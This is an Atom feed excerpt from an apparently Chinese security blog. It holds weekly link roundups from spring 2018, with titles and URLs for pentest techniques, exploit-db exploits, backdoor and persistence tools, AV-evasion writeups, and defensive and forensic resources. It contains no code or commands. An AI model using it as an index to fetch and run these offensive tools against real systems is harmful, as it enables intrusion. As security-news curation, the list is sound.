<li>利用 PATH 环境变量进行 Linux 提权<br><a href="http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="external">http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
<li>Tcpdump Examples<br><a href="https://hackertarget.com/tcpdump-examples/" target="_blank" rel="external">https://hackertarget.com/tcpdump-examples/</a></li>
<li>内网获得域管权限的五种方法介绍<br><a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#104;&#116;&#x74;&#x70;&#x73;&#x3a;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#117;&#109;&#46;&#99;&#111;&#109;&#47;&#64;&#97;&#100;&#x61;&#109;&#46;&#x74;&#111;&#115;&#99;&#x68;&#x65;&#114;&#x2f;&#x74;&#x6f;&#112;&#45;&#102;&#x69;&#x76;&#x65;&#x2d;&#119;&#x61;&#121;&#x73;&#x2d;&#105;&#x2d;&#x67;&#x6f;&#116;&#45;&#x64;&#x6f;&#x6d;&#x61;&#105;&#110;&#x2d;&#x61;&#x64;&#x6d;&#x69;&#110;&#45;&#111;&#x6e;&#x2d;&#x79;&#x6f;&#117;&#114;&#x2d;&#x69;&#110;&#x74;&#101;&#114;&#110;&#x61;&#x6c;&#x2d;&#110;&#101;&#116;&#x77;&#111;&#x72;&#x6b;&#45;&#98;&#x65;&#x66;&#111;&#114;&#101;&#45;&#108;&#x75;&#110;&#x63;&#104;&#45;&#50;&#48;&#x31;&#56;&#x2d;&#x65;&#100;&#x69;&#116;&#x69;&#x6f;&#110;&#x2d;&#56;&#x32;&#x32;&#x35;&#57;&#97;&#98;&#x37;&#x33;&#x61;&#97;&#97;">&#104;&#116;&#x74;&#x70;&#x73;&#x3a;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#117;&#109;&#46;&#99;&#111;&#109;&#47;&#64;&#97;&#100;&#x61;&#109;&#46;&#x74;&#111;&#115;&#99;&#x68;&#x65;&#114;&#x2f;&#x74;&#x6f;&#112;&#45;&#102;&#x69;&#x76;&#x65;&#x2d;&#119;&#x61;&#121;&#x73;&#x2d;&#105;&#x2d;&#x67;&#x6f;&#116;&#45;&#x64;&#x6f;&#x6d;&#x61;&#105;&#110;&#x2d;&#x61;&#x64;&#x6d;&#x69;&#110;&#45;&#111;&#x6e;&#x2d;&#x79;&#x6f;&#117;&#114;&#x2d;&#x69;&#110;&#x74;&#101;&#114;&#110;&#x61;&#x6c;&#x2d;&#110;&#101;&#116;&#x77;&#111;&#x72;&#x6b;&#45;&#98;&#x65;&#x66;&#111;&#114;&#101;&#45;&#108;&#x75;&#110;&#x63;&#104;&#45;&#50;&#48;&#x31;&#56;&#x2d;&#x65;&#100;&#x69;&#116;&#x69;&#x6f;&#110;&#x2d;&#56;&#x32;&#x32;&#x35;&#57;&#97;&#98;&#x37;&#x33;&#x61;&#97;&#97;</a></li>
<li>BurpBounty - 用于改善主动及被动式扫描的 BurpSuite 扩展插件<br><a href="https://github.com/wagiro/BurpBounty" target="_blank" rel="external">https://github.com/wagiro/BurpBounty</a></li>
<li>lsrootkit - UNIX Rootkit 检测工具<br><a href="https://github.com/David-Reguera-Garcia-Dreg/lsrootkit" target="_blank" rel="external">https://github.com/David-Reguera-Garcia-Dreg/lsrootkit</a></li>
<li>MalwarePersistenceScripts - 恶意软件持久化操作脚本<br><a href="https://github.com/TestingPens/MalwarePersistenceScripts" target="_blank" rel="external">https://github.com/TestingPens/MalwarePersistenceScripts</a></li>
<li>漫画风讲解 DNS over HTTPS<br><a href="https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/" target="_blank" rel="external">https://hacks.mozilla.org/2018/05/a-cartoon-intro-to-dns-over-https/</a></li>
<li>内网备忘录<br><a href="https://paper.seebug.org/610/" target="_blank" rel="external">https://paper.seebug.org/610/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;使用 WinRM 进行横向渗透&lt;br&gt;&lt;a href=&quot;https://pentestlab.b
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180507安全动态</title>
    <link href="http://kevien.github.io/2018/05/07/20180507%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/05/07/20180507安全动态/</id>
    <published>2018-05-07T11:02:29.000Z</published>
    <updated>2018-05-29T07:35:41.172Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>无文件恶意软件攻击检测<br><a href="https://d3pakblog.wordpress.com/2018/05/05/d34n6_fileless-malware-attacks-intro/" target="_blank" rel="external">https://d3pakblog.wordpress.com/2018/05/05/d34n6_fileless-malware-attacks-intro/</a></li>
<li>IDS 入侵检测系统绕过技巧<br><a href="http://seclist.us/ids_bypass-intrussion-detection-system-bypass-tricks.html" target="_blank" rel="external">http://seclist.us/ids_bypass-intrussion-detection-system-bypass-tricks.html</a></li>
<li>域环境下的 LDAP / Kerberos 攻击技巧<br><a href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments" target="_blank" rel="external">https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments</a></li>
<li>使用 SYSTEM 权限下的 RDP 劫持监视管理员操作的方法<br><a href="https://gist.github.com/bohops/f722f1a54d9ac1070350bdcaf2da618b" target="_blank" rel="external">https://gist.github.com/bohops/f722f1a54d9ac1070350bdcaf2da618b</a></li>
<li>新型进程注入技术 “Ctrl-Inject” 介绍<br><a href="https://blog.ensilo.com/ctrl-inject" target="_blank" rel="external">https://blog.ensilo.com/ctrl-inject</a></li>
<li>使用 PDF 窃取 NTLM Hash 的方法及工具介绍<br><a href="https://pentestlab.blog/2018/05/09/pdf-ntlm-hashes/" target="_blank" rel="external">https://pentestlab.blog/2018/05/09/pdf-ntlm-hashes/</a></li>
<li>NBNS 欺骗介绍与工具使用<br><a href="https://pentestlab.blog/2018/05/08/nbns-spoofing/" target="_blank" rel="external">https://pentestlab.blog/2018/05/08/nbns-spoofing/</a></li>
<li>NCC Group 发布新工具 yaml2yara，用于将 YAML 快速转换为 Yara 规则<br><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/tool-release-yaml2yara/" target="_blank" rel="external">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/tool-release-yaml2yara/</a></li>
<li>AutoTTP - Python 实现的 Empire / Metasploit 等框架的 API 调用库，用于实现自动化攻击<br><a href="https://github.com/jymcheong/AutoTTP" target="_blank" rel="external">https://github.com/jymcheong/AutoTTP</a></li>
<li>Google YOLO 点击劫持漏洞详情<br><a href="https://blog.innerht.ml/google-yolo/" target="_blank" rel="external">https://blog.innerht.ml/google-yolo/</a></li>
<li>渗透测试中 HTA 文件的使用技巧<br><a href="http://blog.sevagas.com/?Hacking-around-HTA-files" target="_blank" rel="external">http://blog.sevagas.com/?Hacking-around-HTA-files</a></li>
<li>Simple hook detection Linux module<br><a href="http://shell-storm.org/blog/Simple-Hook-detection-Linux-module/" target="_blank" rel="external">http://shell-storm.org/blog/Simple-Hook-detection-Linux-module/</a></li>
<li>检测 Kerberoast 攻击的艺术<br><a href="https://www.trustedsec.com/2018/05/art_of_kerberoast/" target="_blank" rel="external">https://www.trustedsec.com/2018/05/art_of_kerberoast/</a></li>
<li>从 DNS 流量中提取恶意 DNS 解析的方法<br><a href="https://www.slideshare.net/real_slacker007/finding-evil-in-dns-traffic" target="_blank" rel="external">https://www.slideshare.net/real_slacker007/finding-evil-in-dns-traffic</a></li>
<li>Windows 命令行备忘单（Part 2）WMIC<br><a href="https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/" target="_blank" rel="external">https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/</a></li>
<li>minerchk - 检测 Linux 服务器上恶意挖矿程序的 Bash 脚本<br><a href="https://github.com/Hestat/minerchk" target="_blank" rel="external">https://github.com/Hestat/minerchk</a></li>
<li>build-your-own-x - Build your own 系列，各种环境的构建技术集合<br><a href="https://github.com/danistefanovic/build-your-own-x" target="_blank" rel="external">https://github.com/danistefanovic/build-your-own-x</a></li>
<li>Microsoft Windows 2003 SP2 - ‘RRAS’ SMB 远程代码执行漏洞（CVE-2017-11885）利用<br><a href="https://www.exploit-db.com/exploits/44616/" target="_blank" rel="external">https://www.exploit-db.com/exploits/44616/</a></li>
<li>Windows 系统进程介绍与恶意软件进程取证分析(Video)<br><a href="https://www.youtube.com/watch?v=s98_p3bheL0" target="_blank" rel="external">https://www.youtube.com/watch?v=s98_p3bheL0</a></li>
<li>DARKSURGEON - 用于事件响应，数字取证，恶意软件分析和网络防御的 Windows 虚拟机<br><a href="https://medium.com/@cryps1s/darksurgeon-a-windows-10-packer-project-for-defenders-1a57759856b6GitHub：https://github.com/cryps1s/DARKSURGEON" target="_blank" rel="external">https://medium.com/@cryps1s/darksurgeon-a-windows-10-packer-project-for-defenders-1a57759856b6GitHub：https://github.com/cryps1s/DARKSURGEON</a></li>
<li>mandibule - linux elf 进程注入工具<br><a href="https://github.com/ixty/mandibule" target="_blank" rel="external">https://github.com/ixty/mandibule</a></li>
<li>如何向 Mimikatz 中添加自定义模块<br><a href="https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html" target="_blank" rel="external">https://littlesecurityprince.com/security/2018/03/18/ModuleMimikatz.html</a></li>
<li>Windows 的 Linux 子系统(WSL)使用技巧<br><a href="https://www.hanselman.com/blog/TheYearOfLinuxOnTheWindowsDesktopWSLTipsAndTricks.aspx" target="_blank" rel="external">https://www.hanselman.com/blog/TheYearOfLinuxOnTheWindowsDesktopWSLTipsAndTricks.aspx</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;无文件恶意软件攻击检测&lt;br&gt;&lt;a href=&quot;https://d3pakblog.wordpr
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180502安全动态</title>
    <link href="http://kevien.github.io/2018/05/02/20180502%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/05/02/20180502安全动态/</id>
    <published>2018-05-02T05:24:49.000Z</published>
    <updated>2018-05-29T07:35:45.860Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>滥用 DCOM 进行横向渗透的方法<br><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/" target="_blank" rel="external">https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/</a></li>
<li>JSON Web Token 渗透测试<br>&lt; <a href="https://medium.com/@netscylla/json-web-token-pentesting-890bc2cf0dcd&gt;" target="_blank" rel="external">https://medium.com/@netscylla/json-web-token-pentesting-890bc2cf0dcd&gt;</a></li>
<li>7-Zip：从未初始化的内存到远程代码执行(CVE-2018-10115)<br><a href="https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/" target="_blank" rel="external">https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/</a></li>
<li>TopHat - 采用 RSA 加密的 Shell<br><a href="https://github.com/Eitenne/TopHat" target="_blank" rel="external">https://github.com/Eitenne/TopHat</a></li>
<li>Grok-backdoor - 使用 Ngrok 隧道进行通信的简易 Python 后门<br><a href="https://github.com/deepzec/Grok-backdoor" target="_blank" rel="external">https://github.com/deepzec/Grok-backdoor</a></li>
<li>维权入门之Windows Rid劫持技术<br><a href="http://www.freebuf.com/articles/system/169925.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/169925.html</a></li>
<li>Linux 服务器安全检测手段<br><a href="https://www.trustedsec.com/2018/04/malware-linux/" target="_blank" rel="external">https://www.trustedsec.com/2018/04/malware-linux/</a></li>
<li>使用 Struts2 漏洞绕过防火墙远程执行代码并提升权限<br><a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#104;&#116;&#116;&#x70;&#115;&#x3a;&#x2f;&#47;&#x6d;&#101;&#100;&#105;&#117;&#x6d;&#46;&#99;&#x6f;&#109;&#x2f;&#64;&#108;&#111;&#103;&#105;&#x63;&#x62;&#111;&#109;&#98;&#95;&#x31;&#47;&#x62;&#117;&#x67;&#98;&#x6f;&#117;&#x6e;&#116;&#x79;&#45;&#104;&#x6f;&#119;&#x2d;&#105;&#45;&#x77;&#97;&#x73;&#45;&#97;&#98;&#x6c;&#101;&#x2d;&#x74;&#111;&#x2d;&#98;&#121;&#x70;&#x61;&#x73;&#x73;&#x2d;&#x66;&#x69;&#114;&#101;&#119;&#x61;&#x6c;&#108;&#45;&#x74;&#x6f;&#x2d;&#x67;&#101;&#116;&#x2d;&#x72;&#99;&#101;&#45;&#x61;&#110;&#100;&#45;&#x74;&#x68;&#101;&#110;&#x2d;&#119;&#x65;&#x6e;&#x74;&#45;&#102;&#x72;&#x6f;&#109;&#45;&#x73;&#x65;&#114;&#x76;&#x65;&#114;&#x2d;&#115;&#x68;&#101;&#x6c;&#x6c;&#x2d;&#116;&#111;&#45;&#103;&#x65;&#116;&#45;&#55;&#56;&#51;&#102;&#x37;&#x31;&#49;&#51;&#49;&#x62;&#57;&#52;">&#104;&#116;&#116;&#x70;&#115;&#x3a;&#x2f;&#47;&#x6d;&#101;&#100;&#105;&#117;&#x6d;&#46;&#99;&#x6f;&#109;&#x2f;&#64;&#108;&#111;&#103;&#105;&#x63;&#x62;&#111;&#109;&#98;&#95;&#x31;&#47;&#x62;&#117;&#x67;&#98;&#x6f;&#117;&#x6e;&#116;&#x79;&#45;&#104;&#x6f;&#119;&#x2d;&#105;&#45;&#x77;&#97;&#x73;&#45;&#97;&#98;&#x6c;&#101;&#x2d;&#x74;&#111;&#x2d;&#98;&#121;&#x70;&#x61;&#x73;&#x73;&#x2d;&#x66;&#x69;&#114;&#101;&#119;&#x61;&#x6c;&#108;&#45;&#x74;&#x6f;&#x2d;&#x67;&#101;&#116;&#x2d;&#x72;&#99;&#101;&#45;&#x61;&#110;&#100;&#45;&#x74;&#x68;&#101;&#110;&#x2d;&#119;&#x65;&#x6e;&#x74;&#45;&#102;&#x72;&#x6f;&#109;&#45;&#x73;&#x65;&#114;&#x76;&#x65;&#114;&#x2d;&#115;&#x68;&#101;&#x6c;&#x6c;&#x2d;&#116;&#111;&#45;&#103;&#x65;&#116;&#45;&#55;&#56;&#51;&#102;&#x37;&#x31;&#49;&#51;&#49;&#x62;&#57;&#52;</a></li>
<li>使用 Windows 事件日志存储 Payloads<br><a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#104;&#x74;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#x6d;&#x65;&#100;&#x69;&#117;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#x40;&#53;&#121;&#x78;&#47;&#119;&#x69;&#110;&#x64;&#111;&#119;&#x73;&#45;&#101;&#118;&#x65;&#110;&#116;&#x2d;&#x6c;&#111;&#103;&#45;&#x74;&#x6f;&#45;&#x74;&#104;&#x65;&#x2d;&#100;&#x61;&#x72;&#x6b;&#x2d;&#115;&#105;&#100;&#101;&#x2d;&#115;&#x74;&#x6f;&#x72;&#x69;&#110;&#x67;&#x2d;&#x70;&#97;&#121;&#108;&#x6f;&#97;&#100;&#x73;&#x2d;&#x61;&#110;&#x64;&#45;&#x63;&#111;&#x6e;&#102;&#105;&#x67;&#x75;&#114;&#x61;&#116;&#105;&#x6f;&#x6e;&#x73;&#45;&#57;&#x63;&#x38;&#x61;&#x64;&#57;&#50;&#54;&#51;&#55;&#x66;&#50;">&#104;&#x74;&#x74;&#x70;&#x73;&#58;&#47;&#x2f;&#x6d;&#x65;&#100;&#x69;&#117;&#x6d;&#46;&#x63;&#111;&#109;&#47;&#x40;&#53;&#121;&#x78;&#47;&#119;&#x69;&#110;&#x64;&#111;&#119;&#x73;&#45;&#101;&#118;&#x65;&#110;&#116;&#x2d;&#x6c;&#111;&#103;&#45;&#x74;&#x6f;&#45;&#x74;&#104;&#x65;&#x2d;&#100;&#x61;&#x72;&#x6b;&#x2d;&#115;&#105;&#100;&#101;&#x2d;&#115;&#x74;&#x6f;&#x72;&#x69;&#110;&#x67;&#x2d;&#x70;&#97;&#121;&#108;&#x6f;&#97;&#100;&#x73;&#x2d;&#x61;&#110;&#x64;&#45;&#x63;&#111;&#x6e;&#102;&#105;&#x67;&#x75;&#114;&#x61;&#116;&#105;&#x6f;&#x6e;&#x73;&#45;&#57;&#x63;&#x38;&#x61;&#x64;&#57;&#50;&#54;&#51;&#55;&#x66;&#50;</a></li>
<li>Passhunt - 用于搜索网络设备，Web应用程序等的默认账户密码的工具<br><a href="https://github.com/Viralmaniar/Passhunt" target="_blank" rel="external">https://github.com/Viralmaniar/Passhunt</a></li>
<li>隐藏 Metasploit Shellcode 以逃避 Windows Defender 查杀<br><a href="https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/" target="_blank" rel="external">https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/</a></li>
<li>kurukshetra - 用于安全编码教学的 Web 框架<br><a href="https://github.com/a0xnirudh/kurukshetra" target="_blank" rel="external">https://github.com/a0xnirudh/kurukshetra</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;滥用 DCOM 进行横向渗透的方法&lt;br&gt;&lt;a href=&quot;https://bohops.com
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180423安全动态</title>
    <link href="http://kevien.github.io/2018/04/23/20180423%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/04/23/20180423安全动态/</id>
    <published>2018-04-23T05:44:34.000Z</published>
    <updated>2018-05-18T08:56:22.783Z</updated>
    
    <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
<li>使用 RDP 中间人攻击进行横向渗透<br><a href="https://pentestlab.blog/2018/04/24/lateral-movement-rdp/" target="_blank" rel="external">https://pentestlab.blog/2018/04/24/lateral-movement-rdp/</a></li>
<li>利用 Java 的类型混淆漏洞逃逸沙盒（CVE-2018-2826）<br><a href="https://www.zerodayinitiative.com/blog/2018/4/25/when-java-throws-you-a-lemon-make-limenade-sandbox-escape-by-type-confusion" target="_blank" rel="external">https://www.zerodayinitiative.com/blog/2018/4/25/when-java-throws-you-a-lemon-make-limenade-sandbox-escape-by-type-confusion</a></li>
<li>mercuryiss-kali：Kali Linux Docker 容器<br><a href="https://github.com/ac-mercury/mercuryiss-kali" target="_blank" rel="external">https://github.com/ac-mercury/mercuryiss-kali</a></li>
<li>WebLogic反序列化漏洞（CVE-2018-2628）漫谈<br><a href="https://paper.seebug.org/584/" target="_blank" rel="external">https://paper.seebug.org/584/</a></li>
<li>使用开源工具建立 MacOS 安全监控(osquery + santa + openBSM)<br><a href="https://blogs.dropbox.com/tech/2018/04/4696/" target="_blank" rel="external">https://blogs.dropbox.com/tech/2018/04/4696/</a></li>
<li>使用 Active Directory 中的 ACL 提升权限<br><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="external">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li>
<li>adaudit - 活动目录安全审计脚本<br><a href="https://github.com/phillips321/adaudit" target="_blank" rel="external">https://github.com/phillips321/adaudit</a></li>
<li>无需内存泄露，基于堆风水技术实现 libc-2.24 的 RCE<br><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="external">https://github.com/romanking98/House-Of-Roman</a></li>
<li>TPLINK TLWR740N 路由器远程代码执行漏洞分析与利用(CVE-2017-13772)<br><a href="https://www.fidusinfosec.com/a-curious-case-of-code-reuse-tplink-cve-2017-13772-v2" target="_blank" rel="external">https://www.fidusinfosec.com/a-curious-case-of-code-reuse-tplink-cve-2017-13772-v2</a></li>
<li>嵌入 CVE-2017–11882 漏洞利用的恶意 RTF 文档分析<br><a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#104;&#116;&#x74;&#x70;&#115;&#58;&#47;&#47;&#x6d;&#x65;&#100;&#105;&#117;&#109;&#x2e;&#99;&#111;&#x6d;&#x2f;&#64;&#x5f;&#95;&#x66;&#x61;&#x73;&#116;&#99;&#x61;&#x6c;&#108;&#47;&#99;&#118;&#101;&#45;&#x32;&#48;&#49;&#x37;&#45;&#x31;&#x31;&#56;&#56;&#x32;&#45;&#x72;&#x74;&#x66;&#x2d;&#52;&#52;&#x64;&#54;&#55;&#x31;&#x64;&#99;&#x30;&#102;&#99;&#x65;">&#104;&#116;&#x74;&#x70;&#115;&#58;&#47;&#47;&#x6d;&#x65;&#100;&#105;&#117;&#109;&#x2e;&#99;&#111;&#x6d;&#x2f;&#64;&#x5f;&#95;&#x66;&#x61;&#x73;&#116;&#99;&#x61;&#x6c;&#108;&#47;&#99;&#118;&#101;&#45;&#x32;&#48;&#49;&#x37;&#45;&#x31;&#x31;&#56;&#56;&#x32;&#45;&#x72;&#x74;&#x66;&#x2d;&#52;&#52;&#x64;&#54;&#55;&#x31;&#x64;&#99;&#x30;&#102;&#99;&#x65;</a></li>
<li>Grok-backdoor - 使用 Ngrok 隧道进行通信的简易 Python 后门<br><a href="https://github.com/deepzec/Grok-backdoor" target="_blank" rel="external">https://github.com/deepzec/Grok-backdoor</a></li>
<li>nemesis - 用于网络报文构造与注入的命令行工具<br><a href="https://github.com/troglobit/nemesis" target="_blank" rel="external">https://github.com/troglobit/nemesis</a></li>
<li>windows10_ntfs_crash_dos - 特殊构造的 NTFS 镜像可导致多个版本的 Windows 崩溃<br><a href="https://github.com/mtivadar/windows10_ntfs_crash_dos" target="_blank" rel="external">https://github.com/mtivadar/windows10_ntfs_crash_dos</a></li>
<li>Script for installing SIP and PyQt4 on Mac OS X.<br><a href="https://gist.github.com/tkanmae/64f4766f2f947b4cfa1f" target="_blank" rel="external">https://gist.github.com/tkanmae/64f4766f2f947b4cfa1f</a></li>
<li>电子取证系列<br><a href="https://www.hackers-arise.com/single-post/2016/09/19/Digital-Forensics-Part-1-Capturing-a-Forensically-Sound-Image" target="_blank" rel="external">https://www.hackers-arise.com/single-post/2016/09/19/Digital-Forensics-Part-1-Capturing-a-Forensically-Sound-Image</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;使用 RDP 中间人攻击进行横向渗透&lt;br&gt;&lt;a href=&quot;https://pentestlab.blog/2
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180416每周安全动态</title>
    <link href="http://kevien.github.io/2018/04/16/20180416%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/04/16/20180416每周安全动态/</id>
    <published>2018-04-16T05:46:50.000Z</published>
    <updated>2018-04-21T16:03:35.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>通过向 SNMP 配置文件注入内容实现远程命令执行<br><a href="https://digi.ninja/blog/snmp_to_shell.php" target="_blank" rel="external">https://digi.ninja/blog/snmp_to_shell.php</a></li>
<li>渗透测试技巧：使用 expand.exe 拷贝文件<br><a href="https://twitter.com/i/web/status/986628482858807297" target="_blank" rel="external">https://twitter.com/i/web/status/986628482858807297</a></li>
<li>GetVulnerableGPO - 用于寻找不安全的 GPO 组策略配置的 PowerShell 脚本<br><a href="https://github.com/gpoguy/GetVulnerableGPO" target="_blank" rel="external">https://github.com/gpoguy/GetVulnerableGPO</a></li>
<li>GNU Beep 1.3 - ‘HoleyBeep’ 本地提权漏洞利用 Python 脚本<br><a href="https://www.exploit-db.com/exploits/44452/" target="_blank" rel="external">https://www.exploit-db.com/exploits/44452/</a></li>
<li>PastebinMarkdownXSS - Pastebin 由于对 Markdown 过滤不完善而导致的 XSS 漏洞详情披露<br><a href="https://github.com/Nhoya/PastebinMarkdownXSS" target="_blank" rel="external">https://github.com/Nhoya/PastebinMarkdownXSS</a></li>
<li>pyt - 用于检测 Python Web 应用安全漏洞的静态扫描工具<br><a href="https://github.com/python-security/pyt" target="_blank" rel="external">https://github.com/python-security/pyt</a></li>
<li>一款用于替代 PsExec 远程执行命令的 PowerShell 模块 Invoke-CommandAs 介绍<br><a href="https://mkellerman.github.io/Death_to_psexec/" target="_blank" rel="external">https://mkellerman.github.io/Death_to_psexec/</a></li>
<li>pown - Node.js 上的安全测试与漏洞利用框架<br><a href="https://github.com/pownjs/pown" target="_blank" rel="external">https://github.com/pownjs/pown</a></li>
<li>如何制作一个 Password Cracker<br><a href="https://secapps.com/blog/2018/03/how-to-make-a-password-cracker" target="_blank" rel="external">https://secapps.com/blog/2018/03/how-to-make-a-password-cracker</a></li>
<li>Vultr 域名劫持漏洞<br><a href="https://vincentyiu.co.uk/vultr-domain-hijacking/" target="_blank" rel="external">https://vincentyiu.co.uk/vultr-domain-hijacking/</a></li>
<li>对一款不到2KB大小的JavaScript后门的深入分析<br><a href="http://www.freebuf.com/articles/web/167702.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/167702.html</a></li>
<li>如何成为好的恶意软件分析师<br><a href="http://www.hexacorn.com/blog/2018/04/14/how-to-become-the-best-malware-analyst-e-v-e-r/" target="_blank" rel="external">http://www.hexacorn.com/blog/2018/04/14/how-to-become-the-best-malware-analyst-e-v-e-r/</a></li>
<li>Pam-Python实现SSH的短信双因素认证<br><a href="http://www.freebuf.com/articles/web/165139.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/165139.html</a></li>
<li>How I got stored XSS using file upload<br><a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#104;&#116;&#x74;&#x70;&#115;&#x3a;&#x2f;&#x2f;&#x6d;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#118;&#105;&#115;&#95;&#x68;&#x61;&#x63;&#x6b;&#x65;&#114;&#47;&#x68;&#x6f;&#x77;&#45;&#x69;&#x2d;&#x67;&#111;&#x74;&#x2d;&#x73;&#116;&#x6f;&#114;&#101;&#100;&#x2d;&#x78;&#x73;&#115;&#45;&#x75;&#115;&#105;&#x6e;&#103;&#x2d;&#102;&#x69;&#108;&#x65;&#x2d;&#x75;&#112;&#108;&#111;&#x61;&#100;&#x2d;&#x35;&#x63;&#51;&#x33;&#x65;&#49;&#x39;&#100;&#102;&#53;&#x31;&#x65;">&#104;&#116;&#x74;&#x70;&#115;&#x3a;&#x2f;&#x2f;&#x6d;&#101;&#x64;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#118;&#105;&#115;&#95;&#x68;&#x61;&#x63;&#x6b;&#x65;&#114;&#47;&#x68;&#x6f;&#x77;&#45;&#x69;&#x2d;&#x67;&#111;&#x74;&#x2d;&#x73;&#116;&#x6f;&#114;&#101;&#100;&#x2d;&#x78;&#x73;&#115;&#45;&#x75;&#115;&#105;&#x6e;&#103;&#x2d;&#102;&#x69;&#108;&#x65;&#x2d;&#x75;&#112;&#108;&#111;&#x61;&#100;&#x2d;&#x35;&#x63;&#51;&#x33;&#x65;&#49;&#x39;&#100;&#102;&#53;&#x31;&#x65;</a></li>
<li><p>滥用 sudo 命令绕过受限 shell 进行权限提升的方法<br><a href="http://touhidshaikh.com/blog/?p=790" target="_blank" rel="external">http://touhidshaikh.com/blog/?p=790</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这里介绍了滥用sudo 命令不使用密码的一些程序获取root shell的方法</div></pre></td></tr></table></figure>
</li>
